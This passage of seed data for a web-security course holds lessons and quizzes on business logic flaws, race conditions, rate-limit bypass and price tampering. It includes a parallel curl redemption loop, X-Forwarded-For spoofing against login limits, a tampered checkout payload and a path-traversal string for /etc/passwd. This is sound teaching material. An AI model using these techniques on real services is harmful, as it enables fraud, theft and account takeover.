        title: 'Business Logic Flaws',
        summary: 'Every request is valid on its own. It is the sequence, or the value, that the app never expected.',
        estimatedMinutes: 9,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              'A business logic flaw is a bug in the RULES of the app, not the code syntax. Nothing crashes, no filter is bypassed, every request looks legitimate - but the app lets you do something the business never intended, like getting a refund twice or skipping the payment step. Scanners miss these entirely because there is no bad character or malformed input to flag; you find them by understanding what the app is supposed to do and then doing something it forgot to forbid.',
          },
          {
            type: 'paragraph',
            text:
              'The mechanism is assumptions. Developers assume users follow the happy path: add to cart, pay, then get the item. They build each step to work, but forget to enforce the ORDER or the LIMITS. So you break the assumption. What if you call the "mark as paid" step directly, without paying? What if you apply the same one-time coupon twice? What if the "cancel and refund" endpoint works even after the item shipped? Each individual request is well-formed and authenticated - the flaw is that the app trusted you to only use them the intended way.',
          },
          {
            type: 'paragraph',
            text:
              'Walk a concrete one. A shopping site gives a `WELCOME10` coupon meant for one use per account. You add items, apply the coupon, and watch the request: `POST /cart/coupon` with body `code=WELCOME10`. The discount applies. You send that exact request a second time. If the total drops again, the app never tracked that you already used it - stack it enough and the order is free. To confirm a logic flaw, you show that a normal-looking sequence of valid requests produces an outcome the business clearly did not intend, and that you can repeat it. There is no error to point at; the proof is the impossible result (a negative price, a doubled refund, a free order).',
          },
          {
            type: 'command',
            description: 'The same valid, authenticated request - sent twice:',
            commands: [
              'POST /cart/coupon  { "code": "WELCOME10" }   -> total: 900',
              'POST /cart/coupon  { "code": "WELCOME10" }   -> total: 810',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Read the two responses. The first apply drops the total from 1000 to 900. The second, identical request drops it again to 810 - proof the server did not remember the coupon was already used. A robust app would reject the second with "coupon already applied". This is the whole art of logic bugs: send legitimate requests in an illegitimate way and read the result for something that should have been impossible.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Replay a one-time action** - reuse a coupon, a referral bonus, a one-per-user offer',
              '**Skip a step** - call a later endpoint (mark-paid, confirm) without the earlier one',
              '**Break a limit** - exceed a max quantity, withdraw more than the balance',
              '**Reverse a state** - refund after delivery, cancel after use',
              '**Think like a cheat** - "what would let me pay less or get more?"',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Why it matters: logic flaws hit the business directly - free products, drained store credit, bypassed paywalls, unlimited use of a paid feature. They are prized in bug bounties precisely because automation cannot find them, so a human who thinks in terms of intent has an edge. In a report you describe the intended rule, the exact sequence of valid requests that broke it, and the concrete gain (order total went to zero, refund issued twice), because the impact is a number the business immediately understands.',
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'Read the app as a set of rules, then break one',
            text:
              'The bug is never a bad character - it is a rule the developer assumed you would follow. List what the app expects you to do in order, then do it out of order.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Test the logic on your own accounts',
            text: 'Exploit business logic only on systems you own or are authorised to assess, using test accounts. Actually taking free goods or real refunds from a live business is fraud, not a finding.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: 'You can look at an app\'s intended flow, find a rule it forgot to enforce, and prove it with a sequence of perfectly valid requests.',
          },
          {
            type: 'quiz',
            question: 'Why do automated scanners usually miss business logic flaws?',
            options: [
              'Scanners cannot send POST requests',
              'There is no malformed input or bad character to flag - every request is valid, and only the intent is wrong',
              'They only work on HTTPS',
              'Logic flaws do not exist in real apps',
            ],
            correctIndex: 1,
            explanation:
              'Logic flaws use well-formed, authenticated requests in an unintended way. With nothing technically malformed to detect, scanners have no signal - it takes a human who understands the intended rules.',
          },
        ],
      },
      {
        slug: 'race-conditions',
        title: 'Race Conditions',
        summary: 'Fire two requests at the exact same instant and both slip through the check before either updates the balance.',
        estimatedMinutes: 10,
        importance: 'core',
        blocks: [
          videoSlot('Race conditions - firing parallel requests through the timing window'),
          {
            type: 'paragraph',
            text:
              'A race condition is a bug in timing. The server does a task in steps - check, then update - and if you can slip a second request in between the check and the update of the first, both requests pass the check against the SAME old value. The classic result: a one-time action happens two, ten, a hundred times, because every request saw "yes, allowed" before any of them wrote "used".',
          },
          {
            type: 'paragraph',
            text:
              'Picture the window concretely. You have 100 rupees of store credit and try to redeem a 100-rupee item. The server does: (1) read balance = 100, (2) check 100 >= 100, yes, (3) subtract 100, balance = 0. That is safe if requests happen one after another. But if you fire two redemption requests at the exact same millisecond, both hit step 1 and read balance = 100, both pass step 2, and both subtract - so you get two items for one balance. The gap between the check and the update is the window, and the whole attack is landing many requests inside it at once.',
          },
          {
            type: 'paragraph',
            text:
              'To exploit it you must send requests in genuine parallel, not one-then-the-other. A tool like Burp Intruder or a small script fires, say, 30 identical requests simultaneously so they arrive before the first one finishes updating. Then you read the results: if you end up with 30 items but your balance only went down by one item\'s worth, the check-then-update window was exploitable. That mismatch - more units delivered than the balance should allow - is the confirmation. A single request, or requests sent slowly one at a time, will not reveal it; the parallelism is essential.',
          },
          {
            type: 'command',
            description: 'Send many identical requests at once (Burp Intruder or a parallel curl loop):',
            commands: [
              'for i in $(seq 1 30); do curl -s -X POST https://example.com/redeem -H "Cookie: session=..." -d "item=gift" & done; wait',
            ],
          },
          {
            type: 'paragraph',
            text:
              'That loop launches 30 redemption requests in the background almost simultaneously (the `&` backgrounds each, `wait` lets them run together), instead of waiting for each to finish. If the server processed them one by one you would get exactly one gift; if you get several gifts for a single balance deduction, the redeem endpoint has a race condition. Reading the output means counting: how many succeeded versus how much your balance actually dropped. In practice, tools built for this (Burp\'s "send group in parallel") land the packets tighter than a shell loop and hit the window more reliably.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**The window** - the gap between "check the value" and "update the value"',
              '**Classic targets** - redeem credit, apply a coupon, withdraw funds, accept an invite, vote once',
              '**The requirement** - requests must arrive in parallel, inside the window',
              '**Tools** - Burp Intruder / Repeater "send in parallel", or a backgrounded request loop',
              '**The tell** - a one-time action succeeds more times than it should for one resource',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Impact: races turn "once" into "many" on things that cost money or grant access - double-spending credit, redeeming a gift card multiple times, over-drawing a balance, bypassing a per-account limit. In a report you describe the check-then-update window, show that parallel requests produced more successful outcomes than the resource allowed (N items for one balance), and state the financial or access impact of that multiplication.',
          },
          {
            type: 'callout',
            variant: 'warning',
            title: 'Sequential testing hides the bug',
            text:
              'Send the requests one at a time and everything looks fine - the first finishes updating before the second checks. You MUST fire them in parallel to land inside the window.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Parallel requests, authorised targets only',
            text: 'Run race-condition tests only against systems you own or are authorised to assess. Actually multiplying real money or goods on a live service is theft, and the flood of requests can also disrupt it.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'Level up',
            text: 'You can spot a check-then-update window and exploit it by firing parallel requests to make a one-time action happen many times.',
          },
          {
            type: 'quiz',
            question: 'What is essential to exploiting a race condition?',
            options: [
              'Sending one very large request',
              'Firing multiple requests in parallel so they hit the window between the check and the update',
              'Using an invalid session cookie',
              'Waiting several minutes between requests',
            ],
            correctIndex: 1,
            explanation:
              'The bug lives in the gap between checking a value and updating it. Only parallel requests arrive before the first one finishes updating, so all of them pass the check against the same old value.',
          },
        ],
      },
      {
        slug: 'rate-limit-bypass',
        title: 'Rate Limit Bypass',
        summary: 'The site says "5 tries then locked". You find the counter it forgot to count, and try 5000.',
        estimatedMinutes: 8,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              'A rate limit is the site saying "you can only do this so many times per minute" - meant to stop brute force, spam, and abuse. A rate limit bypass is finding a way to keep going past the cap, usually because the counter is tied to something you can change or the limit is not applied everywhere. On its own it feels minor; paired with a login form or an OTP check, it is the difference between "can\'t brute force" and "can".',
          },
          {
            type: 'paragraph',
            text:
              'The mechanism: to count your requests, the server has to key the counter on something - your IP, your account, your session, or a header. If it keys on something you control or spoof, you reset the counter at will. The most common mistake is trusting the `X-Forwarded-For` header, which is meant to carry the real client IP through proxies but which you can simply set yourself. Change it each request and the server thinks each request is a new client with a fresh count. Other bypasses: the limit is on `/login` but not on the `/api/login` that does the same thing, or it counts failed attempts but resets on a success you can fake, or it locks the account but not password-reset attempts.',
          },
          {
            type: 'code',
            language: 'text',
            filename: 'x-forwarded-for-rotation',
            code: 'POST /login   X-Forwarded-For: 1.1.1.1   { user, pass: guess1 }   -> 200 (counted as IP 1.1.1.1)\nPOST /login   X-Forwarded-For: 1.1.1.2   { user, pass: guess2 }   -> 200 (counted as IP 1.1.1.2)\nPOST /login   X-Forwarded-For: 1.1.1.3   { user, pass: guess3 }   -> ... never hits the limit',
          },
          {
            type: 'paragraph',
            text:
              'Read what is happening. Each request changes `X-Forwarded-For` to a new fake IP. If the server rate-limits per that header, it sees three different clients and never trips the "too many attempts" block - so you can send thousands of password guesses that should have been stopped after five. To confirm a bypass, first find the real limit by hitting the endpoint until it blocks you (a `429` or a lockout message). Then apply your trick - rotate the header, switch to the alternate endpoint - and see if you sail past the same count. Getting past the number that previously blocked you is the confirmation.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Header spoofing** - `X-Forwarded-For`, `X-Real-IP`, `X-Client-IP` set to a fresh value each request',
              '**Alternate endpoints** - `/login` limited but `/api/login` or a mobile endpoint is not',
              '**Case and path tricks** - `/Login`, `/login/`, added query string, treated as a different route',
              '**Counter resets** - a limit that resets on any success, or counts per-session and you rotate sessions',
              '**Find the real limit first** - hit it until it blocks, so you can prove you got past it',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Why it matters: a rate limit is often the ONLY thing standing between an attacker and a working brute force. Bypass it on a login and weak passwords fall; bypass it on an OTP or password-reset code and you can guess a 4-6 digit code by trying them all. In a report, show the limit exists (the block after N tries), the bypass that defeats it, and what it enables downstream - "unlimited OTP guesses means account takeover" is far stronger than "the rate limit can be bypassed".',
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'The counter has to key on something',
            text:
              'Ask what the server uses to count you - IP, header, session, account. If any of those is attacker-controlled or the limit is missing on a twin endpoint, the cap is bypassable.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Do not brute force real accounts',
            text: 'Test rate limits only on systems you own or are authorised to assess. Actually brute-forcing a real person\'s login or OTP is unauthorised access, and the request volume can knock a service over.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: 'You can find what a rate limit counts on, defeat it, and explain why a bypass on a login or OTP endpoint escalates straight to account takeover.',
          },
          {
            type: 'quiz',
            question: 'A login is rate-limited, but changing the X-Forwarded-For header each request lets you keep guessing. Why?',
            options: [
              'The header encrypts the password',
              'The server keys its rate-limit counter on that header, which the client can set to any value',
              'The header disables HTTPS',
              'It makes the requests faster',
            ],
            correctIndex: 1,
            explanation:
              'X-Forwarded-For is client-settable. If the server counts attempts per that header, spoofing a new value each time looks like a brand-new client and never trips the limit.',
          },
        ],
      },
      {
        slug: 'price-and-quantity-tampering',
        title: 'Price and Quantity Tampering',
        summary: 'The price is decided by a number in the request. So you decide the number.',
        estimatedMinutes: 9,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              'Price and quantity tampering is a specific, common business-logic bug: the app lets the CLIENT send the price, the quantity, or the discount, and the server trusts it. You intercept the checkout request, change the number, and pay what you decided instead of what the item costs. It is the purest example of the golden rule of web security - never trust the client - being broken with real money on the line.',
          },
          {
            type: 'paragraph',
            text:
              'The mechanism is misplaced trust. The server should look up the price from its own database using the product id and calculate the total itself. A vulnerable server instead reads a `price` or `amount` field straight from the request the browser sent - and you control every byte of that request. So you add an item, go to pay, intercept the request in a proxy, and edit `price` from 999 to 1, or `quantity` from 1 to -1 (a negative quantity can produce a negative total, i.e. the store paying you). The server processes the order at your number because it never re-checked.',
          },
          {
            type: 'code',
            language: 'text',
            filename: 'tampered-checkout',
            code: 'Original:  POST /checkout  { "productId": "A123", "price": 999, "qty": 1 }\nTampered:  POST /checkout  { "productId": "A123", "price": 1,   "qty": 1 }\n\nResponse: order confirmed, total 1',
          },
          {
            type: 'paragraph',
            text:
              'Read the two requests. The real product costs 999, sent in the `price` field. You change that field to 1 and resend. The response confirms the order at a total of 1 - proof the server took the price from your request instead of its own records. To confirm the bug cleanly, use a small, obviously-wrong value (1, not 0, which some systems reject as free) and check the order actually completes at the tampered amount. If the server ignores your `price` and charges 999 anyway, it is calculating server-side and there is no bug. Also test negative quantities and stacked discount codes - same root cause, different field.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Fields to tamper** - `price`, `amount`, `total`, `discount`, `qty`, `currency`',
              '**Negative values** - `qty: -1` or a negative price can flip the total in your favour',
              '**Currency swap** - change `INR` to a weaker unit if the server does not re-price',
              '**Discount stacking** - send the same coupon field twice, or a discount over 100%',
              '**The fix** - server recomputes every money value from its own data, ignoring client numbers',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Impact is immediate and financial: buy expensive goods for a rupee, refund more than you paid, or make the store owe you money with a negative total. It is high severity because it is direct theft and trivially repeatable. In a report you show the original request, the tampered field, and the confirmed order at the wrong total, then state the loss per order and that it can be repeated at will - a clear monetary impact any triager acts on fast.',
          },
          {
            type: 'callout',
            variant: 'warning',
            title: 'If the number is in the request, assume it is editable',
            text:
              'Any price, quantity, or discount the client sends can be changed. The only safe design recomputes money on the server from its own database using just the product id.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Never complete a real tampered order',
            text: 'Tamper prices only against systems you own or are authorised to test, using test payment methods. Actually buying real goods at a forged price is fraud and theft, not a proof-of-concept.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'Locked in',
            text: 'You can intercept a checkout, change a client-controlled price or quantity, and prove the server trusted your number instead of its own.',
          },
          { type: 'practice_ref', title: 'Logic and Race Conditions check', exerciseSlug: 'logic-and-race-conditions-quiz' },
          {
            type: 'quiz',
            question: 'A checkout request includes a "price" field, and changing it to 1 gets you the item for 1 rupee. What is the underlying mistake?',
            options: [
              'The price field was not encrypted',
              'The server trusts a money value sent by the client instead of computing it from its own database',
              'The product id was wrong',
              'The site uses HTTP',
            ],
            correctIndex: 1,
            explanation:
              'The client controls the whole request, including any price it sends. A safe server ignores the client\'s price and recalculates the total from the product id against its own records.',
          },
        ],
      },
    ],
  },
];

export const EXERCISES: ExerciseSeed[] = [
  {
    lessonSlug: 'cors-misconfiguration',
    slug: 'csrf-ssrf-redirects-quiz',
    title: 'CSRF, SSRF and Redirects check',
    instructions: 'Five quick ones. Get four right and the module is yours.',
    kind: 'quiz',
    xpReward: 25,
    questions: [
      {
        prompt: 'What does a CSRF attack rely on to work?',
        options: [
          'Stealing the victim\'s password',
          'The browser auto-attaching the victim\'s session cookie to a request the attacker\'s page triggers',
          'Cracking the site\'s TLS certificate',
          'The victim disabling their firewall',
        ],
        correctIndex: 1,
        explanation:
          'The browser sends the session cookie with any request to that site, so a request fired from the attacker\'s page arrives already authenticated.',
      },
      {
        prompt: 'Which address is the prize target for SSRF on a cloud server?',
        options: ['8.8.8.8', '169.254.169.254', '127.0.0.1 only', '255.255.255.255'],
        correctIndex: 1,
        explanation:
          '169.254.169.254 is the cloud metadata service, reachable only from inside the instance, and it can return the machine\'s temporary credentials.',
      },
      {
        prompt: 'Why is filtering out the word "localhost" a weak SSRF defence?',
        options: [
          'It slows the server down',
          'It is easily bypassed with things like 127.1, decimal IPs, or DNS rebinding',
          'It blocks all traffic',
          'Localhost is not a real address',
        ],
        correctIndex: 1,
        explanation:
          'Blocklists miss equivalent forms - 127.1, decimal-encoded IPs, and hostnames that rebind to 127.0.0.1. An allowlist is the real fix.',
      },
      {
        prompt: 'When does an open redirect become high severity rather than a minor issue?',
        options: [
          'When it is on the homepage',
          'When it sits in an OAuth flow and can carry a token or auth code to the attacker',
          'When the URL is long',
          'When the site uses cookies',
        ],
        correctIndex: 1,
        explanation:
          'A redirect target in an OAuth flow receives a token or code. An attacker-controlled target can send that credential off-site, escalating to account takeover.',
      },
      {
        prompt: 'Which CORS response makes a logged-in user\'s data readable by an attacker\'s page?',
        options: [
          'Access-Control-Allow-Origin: * with no credentials',
          'A reflected Allow-Origin plus Access-Control-Allow-Credentials: true',
          'No CORS headers at all',
          'A single fixed allowed origin',
        ],
        correctIndex: 1,
        explanation:
          'Mirroring the attacker\'s Origin back and allowing credentials lets their page read the response with the victim\'s cookies. A wildcard blocks credentials.',
      },
    ],
  },
  {
    lessonSlug: 'xxe',
    slug: 'files-and-uploads-quiz',
    title: 'Files, Uploads and Parsers check',
    instructions: 'Five quick ones. Get four right and the module is yours.',
    kind: 'quiz',
    xpReward: 25,
    questions: [
      {
        prompt: 'Which of these can a client freely lie about when uploading a file?',
        options: [
          'The file\'s magic bytes',
          'The Content-Type header',
          'The server\'s disk layout',
          'The server\'s PHP version',
        ],
        correctIndex: 1,
        explanation:
          'The Content-Type header is set by the client, so trusting it to decide the file type lets an attacker disguise a script as an image.',
      },
      {
        prompt: 'An uploaded shell only gives code execution when...',
        options: [
          'it is bigger than 1MB',
          'it lands in a folder the server actually executes, not one it merely serves',
          'the filename is in English',
          'the upload used HTTPS',
        ],
        correctIndex: 1,
        explanation:
          'A file saved somewhere served-but-not-executed is not RCE. Execution requires the location to run the file as code.',
      },
      {
        prompt: 'In /view?page=../../../../etc/passwd, the ../ sequences are used to...',
        options: [
          'encrypt the path',
          'climb out of the intended folder to reach a file elsewhere',
          'repeat the request',
          'set file permissions',
        ],
        correctIndex: 1,
        explanation:
          'Each ../ steps up a directory. Enough of them walk out of the pages folder to the root and down into a target file.',
      },
      {
        prompt: 'Besides reading local files, what else can an XXE attack often do?',
        options: [
          'Act as an SSRF by pointing an external entity at an internal or metadata URL',
          'Delete the database',
          'Change the server\'s IP address',
          'Crack password hashes',
        ],
        correctIndex: 0,
        explanation:
          'An external entity can be a URL, so the same bug that reads file:///etc/passwd can hit http://169.254.169.254/ - a file-read and an SSRF at once.',
      },
      {
        prompt: 'You edit a base64 cookie from role:user to role:admin and gain admin. The server was guilty of...',
        options: [
          'weak encryption',
          'insecure deserialization - rebuilding an object from client data with no integrity check',
          'an expired session',
          'a slow database',
        ],
        correctIndex: 1,
        explanation:
          'Insecure deserialization trusts attacker-controlled serialized data. With no signature to detect tampering, a modified blob rebuilds into a privileged object.',
      },
    ],
  },
  {
    lessonSlug: 'price-and-quantity-tampering',
    slug: 'logic-and-race-conditions-quiz',
    title: 'Logic and Race Conditions check',
    instructions: 'Five quick ones. Get four right and the module is yours.',
    kind: 'quiz',
    xpReward: 25,
    questions: [
      {
        prompt: 'Why do automated scanners miss business logic flaws?',
        options: [
          'Scanners cannot log in',
          'Every request is valid and only the intent is wrong, so there is nothing malformed to flag',
          'Logic flaws only exist in mobile apps',
          'Scanners ignore POST requests',
        ],
        correctIndex: 1,
        explanation:
          'Logic flaws use well-formed, authenticated requests in an unintended way. With no bad input to detect, a scanner has no signal.',
      },
      {
        prompt: 'What is essential to exploiting a race condition?',
        options: [
          'One very large request',
          'Firing requests in parallel so they hit the window between the check and the update',
          'An invalid cookie',
          'Waiting minutes between tries',
        ],
        correctIndex: 1,
        explanation:
          'The bug is the gap between checking a value and updating it. Only parallel requests pass the check against the same old value before any update lands.',
      },
      {
        prompt: 'Rotating the X-Forwarded-For header defeats a rate limit because...',
        options: [
          'it encrypts the request',
          'the server counts attempts per that client-settable header, so each value looks like a new client',
          'it speeds up the connection',
          'it disables logging',
        ],
        correctIndex: 1,
        explanation:
          'X-Forwarded-For is client-controlled. If the limit keys on it, a fresh value each request looks like a brand-new client and never trips the cap.',
      },
      {
        prompt: 'A checkout trusts a "price" field from the request. What is the fix?',
        options: [
          'Encrypt the price field',
          'Have the server recompute the total from its own database using the product id',
          'Rename the field',
          'Use a longer session cookie',
        ],
        correctIndex: 1,
        explanation:
          'The client controls the whole request. A safe server ignores any client-sent price and calculates money values itself from trusted data.',
      },
      {
        prompt: 'Which is the strongest way to report a rate-limit bypass on an OTP check?',
        options: [
          '"The rate limit can be bypassed."',
          '"Bypassing the limit allows unlimited OTP guesses, leading to account takeover."',
          '"The header is misconfigured."',
          '"The endpoint responds slowly."',
        ],
        correctIndex: 1,
        explanation:
          'Impact sells the finding. Tying the bypass to its downstream consequence - guessable OTP means account takeover - is far stronger than noting the bypass alone.',
      },
    ],
  },
];
